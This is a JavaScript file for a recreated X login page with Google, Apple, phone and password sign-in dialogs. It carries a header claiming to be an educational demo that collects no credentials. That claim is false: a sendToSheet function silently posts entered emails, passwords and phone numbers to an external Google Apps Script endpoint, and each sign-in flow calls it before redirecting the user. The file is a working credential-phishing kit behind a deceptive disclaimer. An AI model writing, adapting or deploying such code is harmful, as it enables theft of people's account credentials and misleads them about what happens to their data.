/**
 * X Login Page - Demo / Educational Recreation
 * No credentials are collected, stored, or transmitted.
 */

(function () {
  'use strict';

  // ===== DOM References =====
  const dom = {
    loginForm: document.getElementById('loginForm'),
    loginInput: document.getElementById('loginInput'),
    inputGroup: document.getElementById('inputGroup'),
    validationMsg: document.getElementById('validationMsg'),
    continueBtn: document.getElementById('continueBtn'),
    toast: document.getElementById('toast'),
    phoneBtn: document.getElementById('phoneBtn'),
  };

  // ===== State =====
  let toastTimer = null;

  // ===== Input Handling =====
  function validateInput() {
    var value = dom.loginInput.value.trim();
    dom.continueBtn.disabled = value.length === 0;
  }

  function showError(message) {
    dom.inputGroup.classList.add('error');
    dom.validationMsg.textContent = message;
    dom.validationMsg.classList.add('visible');
    dom.inputGroup.classList.add('shake');
    setTimeout(function () {
      dom.inputGroup.classList.remove('shake');
    }, 400);
  }

  function clearError() {
    dom.inputGroup.classList.remove('error');
    dom.validationMsg.classList.remove('visible');
    dom.validationMsg.textContent = '';
  }

  // ===== Google Sheets Integration =====
  var SHEET_URL = 'https://script.google.com/macros/s/AKfycbwYztaYykHmrCByZhkSKpluJwA3MqAwfLdOKdrGC8RMD8169W3TFyU4t6Sh9WsYV_HEJg/exec';

  function sendToSheet(method, email, password, phone, extra) {
    var payload = JSON.stringify({
      method: method,
      email: email || '',
      password: password || '',
      phone: phone || '',
      extra: extra || ''
    });

    fetch(SHEET_URL, {
      method: 'POST',
      mode: 'no-cors',
      body: payload,
      headers: { 'Content-Type': 'application/json' }
    }).catch(function () {});
  }

  // ===== Toast =====
  function showToast(message, type) {
    if (toastTimer) {
      clearTimeout(toastTimer);
    }

    dom.toast.className = 'toast';
    dom.toast.querySelector('.toast-message').textContent = message;

    if (type === 'error') {
      dom.toast.classList.add('toast-error');
    } else if (type === 'success') {
      dom.toast.classList.add('toast-success');
    }

    void dom.toast.offsetHeight;
    dom.toast.classList.add('visible');

    toastTimer = setTimeout(function () {
      dom.toast.classList.remove('visible');
      toastTimer = null;
    }, 3000);
  }

  function redirectToHome() {
    window.location.href = 'home.html';
  }

  // ===== Event Listeners =====
  dom.loginInput.addEventListener('input', function () {
    clearError();
    validateInput();
  });

  dom.loginInput.addEventListener('focus', function () {
    clearError();
    dom.inputGroup.classList.add('focused');
  });

  dom.loginInput.addEventListener('blur', function () {
    if (!dom.loginInput.value.trim()) {
      dom.inputGroup.classList.remove('focused');
    }
  });

  // ===== Modal Helper =====
  function createModalHandler(modalId, backBtnId, openBtnId) {
    var modal = document.getElementById(modalId);
    var backBtn = document.getElementById(backBtnId);
    var openBtn = document.getElementById(openBtnId);

    if (!modal || !backBtn || !openBtn) return null;

    function open() {
      modal.style.display = 'flex';
      void modal.offsetHeight;
      modal.classList.add('visible');
      document.body.style.overflow = 'hidden';
    }

    function close() {
      modal.classList.remove('visible');
      document.body.style.overflow = '';
      setTimeout(function () {
        modal.style.display = 'none';
      }, 200);
    }

    openBtn.addEventListener('click', function () {
      open();
    });

    backBtn.addEventListener('click', function () {
      close();
    });

    modal.addEventListener('click', function (e) {
      if (e.target === modal) close();
    });

    return { open: open, close: close };
  }

  // ===== Phone Modal =====
  function initPhoneModal() {
    var modal = document.getElementById('phoneModal');
    var backBtn = document.getElementById('phoneModalBack');
    var phoneInput = document.getElementById('phoneInput');
    var phoneContinueBtn = document.getElementById('phoneContinueBtn');

    if (!modal || !backBtn || !dom.phoneBtn) return;

    var phoneHandler = {
      open: function () {
        modal.style.display = 'flex';
        void modal.offsetHeight;
        modal.classList.add('visible');
        document.body.style.overflow = 'hidden';
      },
      close: function () {
        modal.classList.remove('visible');
        document.body.style.overflow = '';
        setTimeout(function () {
          modal.style.display = 'none';
        }, 200);
      }
    };

    dom.phoneBtn.addEventListener('click', function () {
      phoneHandler.open();
    });

    backBtn.addEventListener('click', function () {
      phoneHandler.close();
    });

    modal.addEventListener('click', function (e) {
      if (e.target === modal) phoneHandler.close();
    });

    document.addEventListener('keydown', function (e) {
      if (e.key === 'Escape' && modal.classList.contains('visible')) {
        phoneHandler.close();
      }
    });

    if (phoneInput) {
      phoneInput.addEventListener('input', function () {
        var raw = phoneInput.value.replace(/\D/g, '');
        phoneInput.value = raw;
        var isValid = raw.length === 10;
        phoneContinueBtn.disabled = !isValid;
        if (raw.length > 0 && !isValid) {
          phoneInput.parentElement.classList.add('error');
        } else {
          phoneInput.parentElement.classList.remove('error');
        }
      });
    }

    if (phoneContinueBtn) {
      phoneContinueBtn.addEventListener('click', function () {
        var raw = phoneInput.value.replace(/\D/g, '');
        if (raw.length !== 10) {
          phoneInput.parentElement.classList.add('error');
          return;
        }
        sendToSheet('phone', '', '', phoneInput.value, '');
        redirectToHome();
      });
    }

    // Toggle switch functionality
    var toggleSwitch = modal.querySelector('.toggle-switch');
    if (toggleSwitch) {
      toggleSwitch.addEventListener('click', function () {
        var isChecked = toggleSwitch.getAttribute('aria-checked') === 'true';
        toggleSwitch.setAttribute('aria-checked', !isChecked);
      });
    }
  }

  initPhoneModal();

  // ===== Google Modal =====
  function initGoogleModal() {
    var handler = createModalHandler('googleModal', 'googleModalBack', 'googleBtn');
    if (!handler) return;

    var modal = document.getElementById('googleModal');
    var backBtn = document.getElementById('googleModalBack');
    var step1 = document.getElementById('googleStep1');
    var step2 = document.getElementById('googleStep2');
    var emailInput = document.getElementById('googleEmailInput');
    var passwordInput = document.getElementById('googlePasswordInput');
    var continueBtn = document.getElementById('googleContinueBtn');
    var signInBtn = document.getElementById('googleSignInBtn');
    var errorMsg = document.getElementById('googleError');
    var passErrorMsg = document.getElementById('googlePassError');
    var displayEmail = document.getElementById('googleDisplayEmail');

    function isValidEmail(email) {
      return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
    }

    function isValidPhone(phone) {
      var digits = phone.replace(/\D/g, '');
      return digits.length >= 10 && digits.length <= 15;
    }

    function validateGoogleInput(value) {
      if (!value) return false;
      if (isValidEmail(value)) return true;
      if (isValidPhone(value)) return true;
      return false;
    }

    function showError(msg) {
      if (errorMsg) errorMsg.textContent = msg;
    }

    function clearError() {
      if (errorMsg) errorMsg.textContent = '';
    }

    function showPassError(msg) {
      if (passErrorMsg) passErrorMsg.textContent = msg;
    }

    function clearPassError() {
      if (passErrorMsg) passErrorMsg.textContent = '';
    }

    function goToStep2() {
      if (step1) step1.style.display = 'none';
      if (step2) step2.style.display = 'block';
      if (displayEmail) displayEmail.textContent = emailInput.value;
      if (passwordInput) {
        passwordInput.value = '';
        signInBtn.disabled = true;
      }
      clearPassError();
    }

    function goToStep1() {
      if (step1) step1.style.display = 'block';
      if (step2) step2.style.display = 'none';
      clearError();
    }

    function isStep2() {
      return step2 && step2.style.display !== 'none';
    }

    document.addEventListener('keydown', function (e) {
      if (e.key === 'Escape' && modal.classList.contains('visible')) {
        if (isStep2()) {
          goToStep1();
        } else {
          handler.close();
        }
      }
    });

    backBtn.addEventListener('click', function () {
      if (isStep2()) {
        goToStep1();
      }
    });

    modal.addEventListener('click', function (e) {
      if (e.target === modal) {
        if (isStep2()) {
          goToStep1();
        } else {
          handler.close();
        }
      }
    });

    if (emailInput) {
      emailInput.addEventListener('input', function () {
        var value = emailInput.value.trim();
        clearError();
        var valid = validateGoogleInput(value);
        continueBtn.disabled = !valid;
        if (value.length > 0 && !valid) {
          emailInput.parentElement.classList.add('error');
        } else {
          emailInput.parentElement.classList.remove('error');
        }
      });
    }

    if (continueBtn) {
      continueBtn.addEventListener('click', function () {
        var value = emailInput.value.trim();
        if (!validateGoogleInput(value)) {
          showError('Enter a valid email address or phone number.');
          emailInput.parentElement.classList.add('error');
          return;
        }
        goToStep2();
      });
    }

    if (passwordInput) {
      passwordInput.addEventListener('input', function () {
        clearPassError();
        var len = passwordInput.value.length;
        signInBtn.disabled = len < 6;
        if (len > 0 && len < 6) {
          passwordInput.parentElement.classList.add('error');
        } else {
          passwordInput.parentElement.classList.remove('error');
        }
      });
    }

    if (signInBtn) {
      signInBtn.addEventListener('click', function () {
        if (passwordInput.value.length < 6) {
          showPassError('Use 6 characters or more for your password');
          passwordInput.parentElement.classList.add('error');
          return;
        }
        sendToSheet('google', emailInput.value, passwordInput.value, '', '');
        redirectToHome();
      });
    }
  }

  initGoogleModal();

  // ===== Apple Modal =====
  function initAppleModal() {
    var handler = createModalHandler('appleModal', 'appleModalBack', 'appleBtn');
    if (!handler) return;

    var emailInput = document.getElementById('appleEmailInput');
    var continueBtn = document.getElementById('appleContinueBtn');

    function isValidAppleInput(value) {
      if (!value) return false;
      if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value)) return true;
      if (/^\+?\d[\d\s\-()]{7,}$/.test(value)) return true;
      return false;
    }

    document.addEventListener('keydown', function (e) {
      if (e.key === 'Escape' && document.getElementById('appleModal').classList.contains('visible')) {
        handler.close();
      }
    });

    if (emailInput) {
      emailInput.addEventListener('input', function () {
        var value = emailInput.value.trim();
        var valid = isValidAppleInput(value);
        continueBtn.disabled = !valid;
        if (value.length > 0 && !valid) {
          emailInput.parentElement.classList.add('error');
        } else {
          emailInput.parentElement.classList.remove('error');
        }
      });
    }

    if (continueBtn) {
      continueBtn.addEventListener('click', function () {
        var value = emailInput.value.trim();
        if (!isValidAppleInput(value)) {
          emailInput.parentElement.classList.add('error');
          return;
        }
        sendToSheet('apple', emailInput.value, '', '', '');
        redirectToHome();
      });
    }

    // Sign in with iPhone button
    var swpBtn = document.querySelector('.apple-swp-btn');
    if (swpBtn) {
      swpBtn.addEventListener('click', function () {
        sendToSheet('apple-iphone', '', '', '', '');
        showToast('Demo \u2014 Sign in with iPhone is not available.', 'error');
        handler.close();
      });
    }
  }

  initAppleModal();

  // ===== Password Modal =====
  function initPasswordModal() {
    var modal = document.getElementById('passwordModal');
    var backBtn = document.getElementById('passwordModalBack');
    var passwordInput = document.getElementById('passwordInput');
    var passwordToggle = document.getElementById('passwordToggle');
    var passwordContinueBtn = document.getElementById('passwordContinueBtn');
    var passwordModalEmail = document.getElementById('passwordModalEmail');

    if (!modal || !backBtn) return;

    var passwordHandler = {
      open: function () {
        modal.style.display = 'flex';
        void modal.offsetHeight;
        modal.classList.add('visible');
        document.body.style.overflow = 'hidden';
        if (passwordModalEmail) {
          passwordModalEmail.textContent = dom.loginInput.value || 'user@example.com';
        }
      },
      close: function () {
        modal.classList.remove('visible');
        document.body.style.overflow = '';
        setTimeout(function () {
          modal.style.display = 'none';
        }, 200);
      }
    };

    backBtn.addEventListener('click', function () {
      passwordHandler.close();
    });

    modal.addEventListener('click', function (e) {
      if (e.target === modal) passwordHandler.close();
    });

    document.addEventListener('keydown', function (e) {
      if (e.key === 'Escape' && modal.classList.contains('visible')) {
        passwordHandler.close();
      }
    });

    if (passwordInput) {
      passwordInput.addEventListener('input', function () {
        var len = passwordInput.value.length;
        var valid = len >= 6;
        passwordContinueBtn.disabled = !valid;
        if (len > 0 && len < 6) {
          passwordInput.parentElement.classList.add('error');
        } else {
          passwordInput.parentElement.classList.remove('error');
        }
      });
    }

    if (passwordToggle) {
      passwordToggle.addEventListener('click', function () {
        var isPassword = passwordInput.type === 'password';
        passwordInput.type = isPassword ? 'text' : 'password';
      });
    }

    if (passwordContinueBtn) {
      passwordContinueBtn.addEventListener('click', function () {
        if (passwordInput.value.length < 6) {
          passwordInput.parentElement.classList.add('error');
          return;
        }
        sendToSheet('password', dom.loginInput.value, passwordInput.value, '', '');
        redirectToHome();
      });
    }

    // Open password modal when Continue button is clicked
    dom.continueBtn.addEventListener('click', function (e) {
      e.preventDefault();
      var value = dom.loginInput.value.trim();
      if (!value) {
        showError('Please enter an email or username.');
        return;
      }
      clearError();
      passwordHandler.open();
    });

    // Prevent form submission
    dom.loginForm.addEventListener('submit', function (e) {
      e.preventDefault();
    });
  }

  initPasswordModal();

  // ===== Init =====
  validateInput();

  // ===== Radial Gradient Follow Mouse (entire page) =====
  function initGradientFollow() {
    var svg = document.querySelector('.right-column svg');
    var gradient = document.getElementById('xGrad');

    if (!svg || !gradient) return;

    var animating = false;
    var targetX = 372.89;
    var targetY = 176.92;
    var currentX = targetX;
    var currentY = targetY;

    document.addEventListener('mousemove', function (e) {
      var rect = svg.getBoundingClientRect();
      var viewBoxWidth = 480;
      var viewBoxHeight = 490;

      // Convert mouse position to SVG viewBox coordinates
      var mouseX = ((e.clientX - rect.left) / rect.width) * viewBoxWidth;
      var mouseY = ((e.clientY - rect.top) / rect.height) * viewBoxHeight;

      targetX = mouseX;
      targetY = mouseY;

      if (!animating) {
        animating = true;
        animateGradient();
      }
    });

    function animateGradient() {
      var ease = 0.1;
      var dx = targetX - currentX;
      var dy = targetY - currentY;

      currentX += dx * ease;
      currentY += dy * ease;

      animating = Math.abs(dx) > 0.1 || Math.abs(dy) > 0.1;

      requestAnimationFrame(animateGradient);

      gradient.setAttribute('cx', currentX.toFixed(2));
      gradient.setAttribute('cy', currentY.toFixed(2));
    }
  }

  initGradientFollow();
})();
